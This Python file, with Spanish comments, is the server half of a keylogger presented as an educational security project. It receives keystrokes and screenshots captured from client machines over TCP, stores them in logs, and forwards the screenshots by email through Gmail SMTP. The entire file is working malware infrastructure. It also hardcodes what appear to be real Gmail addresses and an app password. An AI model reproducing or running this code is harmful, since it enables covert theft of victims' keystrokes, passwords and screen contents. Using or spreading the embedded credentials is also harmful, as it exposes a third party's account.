#!/usr/bin/env python3
"""
=============================================================
  SERVIDOR KEYLOGGER - Proyecto de Ciberseguridad (Educativo)
=============================================================
  Recibe teclas capturadas y screenshots del cliente.
  Almacena logs en archivos .txt y screenshots en carpeta.
  Envía capturas de pantalla por correo electrónico.
=============================================================
"""

import socket
import threading
import os
import sys
import json
import smtplib
import argparse
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

# ── Configuración por defecto ──────────────────────────────
DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 9999
LOG_DIR = "logs"
SCREENSHOT_DIR = "screenshots"

# ── Configuración de correo ─────────────────────────────────
EMAIL_ENABLED = True
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_USER = "m4xo25o@gmail.com"
EMAIL_PASS = "hrmj ysyb ndtj mgse"       # App Password de Google
EMAIL_TO = "martinezdeif04@gmail.com"


def setup_directories():
    """Crea los directorios necesarios para almacenar logs y screenshots."""
    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    print(f"[*] Directorio de logs: {os.path.abspath(LOG_DIR)}")
    print(f"[*] Directorio de screenshots: {os.path.abspath(SCREENSHOT_DIR)}")


def send_email(filepath, subject="Captura de Pantalla - Keylogger"):
    """Envía un archivo por correo electrónico usando SMTP."""
    if not EMAIL_ENABLED:
        return

    try:
        msg = MIMEMultipart()
        msg["From"] = EMAIL_USER
        msg["To"] = EMAIL_TO
        msg["Subject"] = subject

        body = (
            f"Captura de pantalla recibida del cliente.\n"
            f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"Archivo: {os.path.basename(filepath)}"
        )
        msg.attach(MIMEText(body, "plain"))

        # Adjuntar el archivo
        with open(filepath, "rb") as f:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(f.read())
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename={os.path.basename(filepath)}"
            )
            msg.attach(part)

        # Enviar
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(EMAIL_USER, EMAIL_PASS)
            server.sendmail(EMAIL_USER, EMAIL_TO, msg.as_string())

        print(f"[✉] Correo enviado con: {os.path.basename(filepath)}")

    except Exception as e:
        print(f"[!] Error al enviar correo: {e}")


def handle_client(conn, addr):
    """
    Maneja la conexión de un cliente.
    Protocolo:
      1. El cliente envía un header JSON terminado en \\n
         { "type": "keys" | "screenshot", "size": <bytes>, "filename": "..." }
      2. Seguido del payload (texto de teclas o imagen binaria)
    """
    client_ip = addr[0]
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_filename = os.path.join(LOG_DIR, f"keylog_{client_ip}_{timestamp}.txt")

    print(f"\n[+] Conexión establecida desde {addr[0]}:{addr[1]}")
    print(f"[+] Archivo de log: {log_filename}")

    buffer = b""

    try:
        with open(log_filename, "a", encoding="utf-8") as log_file:
            log_file.write(f"=== Sesión iniciada: {timestamp} ===\n")
            log_file.write(f"=== Cliente: {client_ip} ===\n\n")

            while True:
                # ── Leer header (línea JSON terminada en \n) ───
                while b"\n" not in buffer:
                    chunk = conn.recv(4096)
                    if not chunk:
                        raise ConnectionError("Cliente desconectado")
                    buffer += chunk

                header_line, buffer = buffer.split(b"\n", 1)

                try:
                    header = json.loads(header_line.decode("utf-8"))
                except json.JSONDecodeError:
                    print(f"[!] Header inválido recibido: {header_line}")
                    continue

                msg_type = header.get("type", "")
                payload_size = header.get("size", 0)

                # ── Leer payload completo ──────────────────────
                while len(buffer) < payload_size:
                    chunk = conn.recv(4096)
                    if not chunk:
                        raise ConnectionError("Cliente desconectado durante payload")
                    buffer += chunk

                payload = buffer[:payload_size]
                buffer = buffer[payload_size:]

                # ── Procesar según tipo ────────────────────────
                if msg_type == "keys":
                    keys_text = payload.decode("utf-8", errors="replace")
                    ts = datetime.now().strftime("%H:%M:%S")
                    log_file.write(f"[{ts}] {keys_text}\n")
                    log_file.flush()
                    print(f"[⌨] Teclas recibidas ({len(keys_text)} chars)")

                elif msg_type == "screenshot":
                    ss_filename = header.get(
                        "filename",
                        f"screenshot_{client_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                    )
                    ss_path = os.path.join(SCREENSHOT_DIR, ss_filename)

                    with open(ss_path, "wb") as ss_file:
                        ss_file.write(payload)

                    print(f"[📷] Screenshot guardado: {ss_path} ({len(payload)} bytes)")

                    # Enviar por correo en un hilo separado
                    if EMAIL_ENABLED:
                        email_thread = threading.Thread(
                            target=send_email,
                            args=(ss_path,),
                            daemon=True
                        )
                        email_thread.start()

                else:
                    print(f"[?] Tipo de mensaje desconocido: {msg_type}")

            log_file.write(f"\n=== Sesión finalizada: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")

    except ConnectionError:
        print(f"[-] Cliente {addr[0]}:{addr[1]} desconectado")
    except Exception as e:
        print(f"[!] Error con cliente {addr[0]}:{addr[1]}: {e}")
    finally:
        conn.close()
        print(f"[-] Conexión cerrada: {addr[0]}:{addr[1]}")


def start_server(host, port):
    """Inicia el servidor TCP y escucha conexiones entrantes."""
    setup_directories()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind((host, port))
        server_socket.listen(5)

        print(f"\n{'='*55}")
        print(f"  SERVIDOR KEYLOGGER ACTIVO")
        print(f"{'='*55}")
        print(f"  Host:  {host}")
        print(f"  Puerto: {port}")
        print(f"  Email:  {'Activado' if EMAIL_ENABLED else 'Desactivado'}")
        print(f"{'='*55}")
        print(f"[*] Esperando conexiones...\n")

        while True:
            conn, addr = server_socket.accept()
            client_thread = threading.Thread(
                target=handle_client,
                args=(conn, addr),
                daemon=True
            )
            client_thread.start()

    except KeyboardInterrupt:
        print("\n[*] Servidor detenido por el usuario.")
    except Exception as e:
        print(f"[!] Error del servidor: {e}")
    finally:
        server_socket.close()
        print("[*] Socket del servidor cerrado.")


def main():
    parser = argparse.ArgumentParser(
        description="Servidor Keylogger - Proyecto Educativo de Ciberseguridad"
    )
    parser.add_argument(
        "--host", default=DEFAULT_HOST,
        help=f"Dirección IP para escuchar (default: {DEFAULT_HOST})"
    )
    parser.add_argument(
        "--port", "-p", type=int, default=DEFAULT_PORT,
        help=f"Puerto para escuchar (default: {DEFAULT_PORT})"
    )
    parser.add_argument(
        "--email", action="store_true",
        help="Activar envío de screenshots por correo electrónico"
    )
    parser.add_argument(
        "--smtp-user",
        help="Correo electrónico para envío SMTP"
    )
    parser.add_argument(
        "--smtp-pass",
        help="Contraseña o App Password para SMTP"
    )
    parser.add_argument(
        "--email-to",
        help="Correo electrónico destino"
    )

    args = parser.parse_args()

    # Actualizar configuración global de email si se proporcionan args
    global EMAIL_ENABLED, EMAIL_USER, EMAIL_PASS, EMAIL_TO
    if args.email:
        EMAIL_ENABLED = True
        if args.smtp_user:
            EMAIL_USER = args.smtp_user
        if args.smtp_pass:
            EMAIL_PASS = args.smtp_pass
        if args.email_to:
            EMAIL_TO = args.email_to

        if EMAIL_USER == "tu_correo@gmail.com" or EMAIL_PASS == "tu_app_password":
            print("[!] ADVERTENCIA: Configura las credenciales de email.")
            print("    Usa --smtp-user y --smtp-pass, o edita las variables en el código.")

    start_server(args.host, args.port)


if __name__ == "__main__":
    main()
